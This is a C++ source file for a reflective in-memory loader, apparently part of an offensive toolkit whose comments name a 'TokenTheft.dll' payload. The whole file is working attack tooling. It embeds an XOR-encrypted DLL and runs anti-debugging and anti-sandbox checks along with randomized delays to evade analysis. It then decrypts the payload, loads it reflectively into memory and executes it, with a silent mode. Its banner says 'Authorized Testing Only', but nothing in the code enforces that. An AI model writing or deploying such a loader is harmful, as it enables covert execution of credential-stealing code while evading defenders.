#include "ReflectiveLoader.h"
#include <iostream>
#include <fstream>
#include <vector>
#include <random>
#include <intrin.h>

// ============================================================================
// Embedded Encrypted Payload
// ============================================================================

// XOR key for payload decryption (same as C# side)
static const BYTE g_XorKey[] = { 0x7A, 0x3C, 0x9E, 0x1F, 0x4D, 0x2B, 0x88, 0xC6 };
static const DWORD g_XorKeySize = sizeof(g_XorKey);

// IMPORTANT: Replace this with your actual encrypted payload!
// Generate using: python encrypt_payload.py TokenTheft.dll payload.enc
// Then copy the hex bytes from payload_encrypted.h into the array below

static const BYTE g_EncryptedPayload[] = {
    // === START OF ENCRYPTED PAYLOAD - REPLACE WITH YOUR DATA ===
    // Example placeholder bytes (replace with actual encrypted DLL):
    0x7B, 0x5D, 0xA1, 0x3E, 0x2C, 0x4F, 0x9B, 0xC8, 0x1A, 0x3F, 0x5C, 0x7E,
    // === END OF ENCRYPTED PAYLOAD ===
    0x00  // Last byte
};
static const DWORD g_EncryptedPayloadSize = sizeof(g_EncryptedPayload);

// ============================================================================
// Helper Functions
// ============================================================================

static BOOL g_bVerbose = FALSE;

VOID VerbosePrint(LPCSTR lpFormat, ...)
{
    if (!g_bVerbose) return;
    
    va_list args;
    va_start(args, lpFormat);
    vprintf(lpFormat, args);
    va_end(args);
}

VOID VerbosePrintColor(WORD wColor, LPCSTR lpFormat, ...)
{
    if (!g_bVerbose) return;
    
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(hConsole, &csbi);
    SetConsoleTextAttribute(hConsole, wColor);
    
    va_list args;
    va_start(args, lpFormat);
    vprintf(lpFormat, args);
    va_end(args);
    
    SetConsoleTextAttribute(hConsole, csbi.wAttributes);
}

// ============================================================================
// Anti-Debug / Anti-Sandbox
// ============================================================================

BOOL IsDebugged()
{
    // Check PEB BeingDebugged flag
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (peb && peb->BeingDebugged) return TRUE;
    
    // Check NtGlobalFlag
    if (peb && (peb->NtGlobalFlag & 0x70)) return TRUE;
    
    // Check for debugger processes
    if (FindWindowA(NULL, "ollydbg") || 
        FindWindowA(NULL, "x64dbg") || 
        FindWindowA(NULL, "IDA Pro")) return TRUE;
    
    return FALSE;
}

BOOL IsRunningInSandbox()
{
    // Check CPU cores
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return TRUE;
    
    // Check RAM (under 2GB = sandbox)
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    if (memInfo.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE;
    
    // Check uptime (under 10 minutes = sandbox)
    if (GetTickCount64() < 10 * 60 * 1000) return TRUE;
    
    // Check for sandbox files
    if (GetFileAttributesA("C:\\sample.exe") != INVALID_FILE_ATTRIBUTES) return TRUE;
    if (GetFileAttributesA("C:\\analyzer.exe") != INVALID_FILE_ATTRIBUTES) return TRUE;
    
    return FALSE;
}

VOID RandomDelay()
{
    srand(GetCurrentProcessId() ^ GetTickCount());
    Sleep((rand() % 3000) + 500);
}

// ============================================================================
// Payload Decryption
// ============================================================================

std::vector<BYTE> DecryptPayload(const BYTE* pEncrypted, DWORD dwSize)
{
    std::vector<BYTE> decrypted(dwSize);
    for (DWORD i = 0; i < dwSize; i++) {
        decrypted[i] = pEncrypted[i] ^ g_XorKey[i % g_XorKeySize];
    }
    return decrypted;
}

// ============================================================================
// Command Line Parsing
// ============================================================================

typedef struct _COMMAND_LINE_OPTIONS {
    BOOL bVerbose;
    BOOL bSilent;
    BOOL bHelp;
    BOOL bNoDelay;
    DWORD dwCustomDelayMs;
    LPCSTR lpFunctionName;
} COMMAND_LINE_OPTIONS;

VOID PrintBanner()
{
    VerbosePrintColor(11, "\n");
    VerbosePrintColor(11, "==================================================\n");
    VerbosePrintColor(11, "  Reflective Loader v2.0 - Authorized Testing Only\n");
    VerbosePrintColor(11, "  Features: Hells Gate | Direct Syscalls | Stealth\n");
    VerbosePrintColor(11, "==================================================\n");
    VerbosePrintColor(11, "\n");
}

VOID PrintUsage()
{
    printf("Usage: loader.exe [options]\n");
    printf("\n");
    printf("Options:\n");
    printf("  -v, --verbose     Enable verbose output\n");
    printf("  -s, --silent      Silent execution (no console window)\n");
    printf("  -e, --entry <func> Entry point function name (default: StartSilent)\n");
    printf("  -d, --delay <ms>   Initial delay before execution\n");
    printf("  --no-delay        Disable random delay\n");
    printf("  -h, --help        Show this help\n");
    printf("\n");
    printf("Examples:\n");
    printf("  loader.exe -v\n");
    printf("  loader.exe --silent\n");
    printf("  loader.exe -v -e Start\n");
    printf("\n");
}

BOOL ParseCommandLine(int argc, char* argv[], COMMAND_LINE_OPTIONS* pOptions)
{
    // Default values
    pOptions->bVerbose = FALSE;
    pOptions->bSilent = FALSE;
    pOptions->bHelp = FALSE;
    pOptions->bNoDelay = FALSE;
    pOptions->dwCustomDelayMs = 0;
    pOptions->lpFunctionName = "StartSilent";
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--verbose") == 0) {
            pOptions->bVerbose = TRUE;
        }
        else if (strcmp(argv[i], "-s") == 0 || strcmp(argv[i], "--silent") == 0) {
            pOptions->bSilent = TRUE;
        }
        else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            pOptions->bHelp = TRUE;
            return TRUE;
        }
        else if (strcmp(argv[i], "--no-delay") == 0) {
            pOptions->bNoDelay = TRUE;
        }
        else if (strcmp(argv[i], "-e") == 0 || strcmp(argv[i], "--entry") == 0) {
            if (i + 1 < argc) {
                pOptions->lpFunctionName = argv[++i];
            } else {
                return FALSE;
            }
        }
        else if (strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--delay") == 0) {
            if (i + 1 < argc) {
                pOptions->dwCustomDelayMs = atoi(argv[++i]);
            } else {
                return FALSE;
            }
        }
        else {
            return FALSE;
        }
    }
    return TRUE;
}

// ============================================================================
// Main Entry Point
// ============================================================================

int main(int argc, char* argv[])
{
    COMMAND_LINE_OPTIONS options;
    
    if (!ParseCommandLine(argc, argv, &options)) {
        PrintUsage();
        return 1;
    }
    
    if (options.bHelp) {
        PrintBanner();
        PrintUsage();
        return 0;
    }
    
    g_bVerbose = options.bVerbose;
    
    PrintBanner();
    
    // Anti-debug checks
    if (IsDebugged()) {
        VerbosePrintColor(12, "[-] Debugger detected! Waiting...\n");
        Sleep(5000);
        return 0;  // Exit silently
    }
    
    // Anti-sandbox check
    if (IsRunningInSandbox()) {
        VerbosePrintColor(12, "[-] Sandbox environment detected, exiting...\n");
        return 0;
    }
    
    // Random delay to evade sandbox
    if (!options.bNoDelay && options.dwCustomDelayMs == 0) {
        RandomDelay();
    } else if (options.dwCustomDelayMs > 0) {
        VerbosePrintColor(14, "[*] Waiting %d ms...\n", options.dwCustomDelayMs);
        Sleep(options.dwCustomDelayMs);
    }
    
    // Check if payload is embedded
    if (g_EncryptedPayloadSize <= 1) {
        VerbosePrintColor(12, "[-] No embedded payload found!\n");
        VerbosePrintColor(12, "    Run encrypt_payload.py to generate the payload\n");
        return 1;
    }
    
    VerbosePrintColor(14, "[*] Embedded payload size: %d bytes\n", g_EncryptedPayloadSize);
    
    // Decrypt payload
    VerbosePrintColor(14, "[*] Decrypting payload...\n");
    std::vector<BYTE> decryptedPayload = DecryptPayload(g_EncryptedPayload, g_EncryptedPayloadSize);
    
    // Verify decryption (check for MZ header)
    if (decryptedPayload.size() >= 2 && 
        decryptedPayload[0] == 'M' && decryptedPayload[1] == 'Z') {
        VerbosePrintColor(10, "[+] Valid PE header detected\n");
    } else {
        VerbosePrintColor(12, "[-] Invalid PE header - decryption may have failed\n");
        VerbosePrintColor(12, "    Make sure the encrypted payload is correct\n");
        return 1;
    }
    
    // Reflective load
    VerbosePrintColor(14, "[*] Reflective loading payload...\n");
    LPVOID pModule = ReflectiveLoader::LoadFromMemory(decryptedPayload.data(), decryptedPayload.size());
    
    if (!pModule) {
        VerbosePrintColor(12, "[-] Reflective loading failed!\n");
        return 1;
    }
    
    VerbosePrintColor(10, "[+] Payload loaded at 0x%p\n", pModule);
    
    // Execute payload
    VerbosePrintColor(14, "[*] Executing payload entry point: %s\n", options.lpFunctionName);
    
    int result;
    if (options.bSilent) {
        result = ReflectiveLoader::ExecutePayloadSilent(pModule);
    } else {
        result = ReflectiveLoader::ExecutePayload(pModule, options.lpFunctionName);
    }
    
    if (result == 0) {
        VerbosePrintColor(10, "[+] Payload executed successfully!\n");
    } else {
        VerbosePrintColor(12, "[-] Payload returned error code: %d\n", result);
    }
    
    // Keep console open in verbose mode
    if (g_bVerbose) {
        VerbosePrintColor(14, "\n[*] Press Enter to exit...\n");
        getchar();
    }
    
    // Optional: Unload module (usually not needed)
    // ReflectiveLoader::Unload(pModule);
    // ReflectiveLoader::Cleanup();
    
    return result;
}

// ============================================================================
// Windows Entry Point (for GUI/Silent mode - no console)
// ============================================================================

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Parse command line from lpCmdLine
    int argc = 1;
    char* argv[32] = { "loader.exe", NULL };
    char cmdLineCopy[512];
    char* token;
    
    if (lpCmdLine && lpCmdLine[0]) {
        strcpy_s(cmdLineCopy, lpCmdLine);
        token = strtok(cmdLineCopy, " ");
        while (token && argc < 31) {
            argv[argc++] = token;
            token = strtok(NULL, " ");
        }
    }
    
    return main(argc, argv);
}